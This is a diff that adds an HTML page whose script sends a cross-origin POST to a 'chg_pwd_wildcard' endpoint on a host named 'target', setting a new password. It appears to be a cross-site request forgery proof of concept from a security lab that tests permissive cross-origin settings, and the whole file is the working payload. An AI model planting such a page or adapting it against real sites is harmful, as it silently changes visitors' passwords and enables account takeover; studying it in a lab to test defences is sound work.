@@ -1,0 +1,20 @@
+<html>
+<body>
+
+<script>
+  fetch("http://target:8000/xploitSCC/chg_pwd_wildcard", {
+        method: "POST",
+        body: JSON.stringify({"new_password" : "New_Password_changed_from_Fetch_JSON_Wildcard"}),
+        headers: {
+          'Content-Type': 'application/json'                          
+        },
+        // credentials: 'include'
+    })
+    .then(response => response.text())
+    .then((response) => {
+        console.log(response);
+    });
+</script>
+
+</body>
+</html>
